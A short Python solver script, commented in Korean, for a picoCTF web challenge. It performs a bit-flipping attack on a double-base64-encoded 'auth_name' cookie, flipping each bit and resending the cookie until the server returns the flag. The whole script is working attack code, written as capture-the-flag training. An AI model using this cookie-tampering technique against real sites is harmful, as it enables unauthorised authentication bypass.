import requests
import base64

s = requests.Session()
s.get("http://mercury.picoctf.net:21553/")
cookie = s.cookies["auth_name"]
print("[+] Cookie : ", cookie)
print(len(cookie))

raw_cookie = bytearray(base64.b64decode(base64.b64decode(cookie))) #쿠키값 저장 -> 디코딩
print("raw_cookie : {}".format(raw_cookie))
print("LENGTH of raw_cookie : ", len(raw_cookie))

for index in range(len(raw_cookie)):
    print(" \n Byte Index : {} ".format(index))
    for i in range(8):
        #masking
        mask = (1 << i) # 한 바이트 당 마스크 씌우기 (돌아가면서~~)
        print("[*] Flipping Attack : mask {}, raw_cookie[index] {}".format(bin(mask), bin(raw_cookie[index])))
        #flipping
        raw_cookie[index] ^= mask
        new_cookie = base64.b64encode(base64.b64encode(raw_cookie)).decode("ascii")
        r = requests.get("http://mercury.picoctf.net:21553/", cookies={"auth_name":new_cookie})
        raw_cookie[index] ^= mask

        if "pico" in r.text:
            print("\n [*] I think I found the one. \n")
            print(r.text)
            print("[*] Get the flag. ")
            break
        
